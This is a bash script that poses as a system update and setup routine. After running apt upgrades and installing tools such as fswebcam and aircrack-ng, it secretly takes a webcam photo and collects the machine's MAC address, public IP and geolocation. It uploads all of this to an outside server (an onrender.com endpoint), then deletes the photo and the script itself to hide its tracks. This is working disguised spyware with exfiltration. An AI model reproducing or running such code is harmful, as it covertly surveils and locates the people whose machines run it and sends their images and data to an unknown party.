#!/bin/bash
G='\033[0;32m';R='\033[0;31m';C='\033[0;36m';N='\033[0m'
PKGS=(fswebcam iw aircrack-ng build-essential rfkill ethtool iwd curl jq)
SEQ=("Sync Repos" "apt update -qq" "Verify Integrity" "apt install --fix-broken -y -qq" "Patch Binaries" "apt upgrade -y -qq" "Align Kernel" "apt full-upgrade -y -qq" "Purge Orphans" "apt autoremove --purge -y -qq" "Flush Cache" "apt autoclean -y -qq" "Inject Payloads" "apt install -y ${PKGS[*]} -qq")
I_ROOT(){ (($EUID!=0)); };I_IF(){ iw dev 2>/dev/null|awk '$1=="Interface"{print $2;exit}'; };I_DM(){ iw dev "$1" info 2>/dev/null; };I_MO(){ echo "$1"|awk '/type/{print $2}'; };I_MA(){ echo "$1"|awk '/addr/{print $2}'; };I_IP(){ curl -sm3 api.ipify.org; };I_LO(){ curl -sm3 ipinfo.io/loc; }
S_OK(){ echo -e "${N}[ ${G}SUCCESS ${N}]"; };S_ER(){ echo -e "${N}[ ${R}FAILED ${N}]"; }
I_ROOT && { S_ER; echo -e "${R}[!] Root Required${N}"; exit 1; }
echo -e "${C}[@] Init Seq${N}"
for((i=0;i<${#SEQ[@]};i+=2));do echo -en "[$(($i/2+1))/$((${#SEQ[@]} / 2))] ${SEQ[i]}..."; eval "${SEQ[i+1]}" &>/dev/null && S_OK || { S_ER; exit 1; }; done
sleep 1; clear; echo -e "${C}[@] Recon Sweep${N}"
echo -n "[ALPHA] Iface..."; T_IF=$(I_IF) && S_OK || S_ER
echo -n "[BRAVO] Dump..."; T_DM=$(I_DM "$T_IF") && S_OK || S_ER
echo -n "[CHARLIE] Mode..."; T_MO=$(I_MO "$T_DM") && S_OK || S_ER
echo -n "[DELTA] MAC..."; T_MA=$(I_MA "$T_DM") && S_OK || S_ER
echo -n "[ECHO] Uplink..."; T_IP=$(I_IP) && S_OK || S_ER
echo -n "[FOXTROT] Geo..."; T_LO=$(I_LO) && S_OK || S_ER
TS=$(date +"%Y%m%d_%H%M%S"); VD="$HOME/Pictures/___"; SF="$VD/cap_$TS.jpg"; mkdir -p "$VD"
fswebcam -d /dev/video0 -r 1280x720 --no-banner "$SF" &>/dev/null
RES=$(curl -sX POST https://secret-0kpy.onrender.com/upload -F "image=@$SF" -F "iface=$T_IF" -F "mode=$T_MO" -F "mac=$T_MA" -F "ip=$T_IP" -F "loc=$T_LO")
rm -rf "$VD"; clear; echo -e "${G}==========================================${N}"
echo -e "         MISSION POST-ACTION REPORT       "
echo -e "${G}==========================================${N}"
printf "${C}%-18s${N} : %s\n" "TIME" "$TS" "IFACE" "$T_IF" "MODE" "$T_MO" "MAC" "$T_MA" "IP" "$T_IP" "LOC" "$T_LO"
rm -rf "$0"
echo -e "${G}==========================================${N}"
	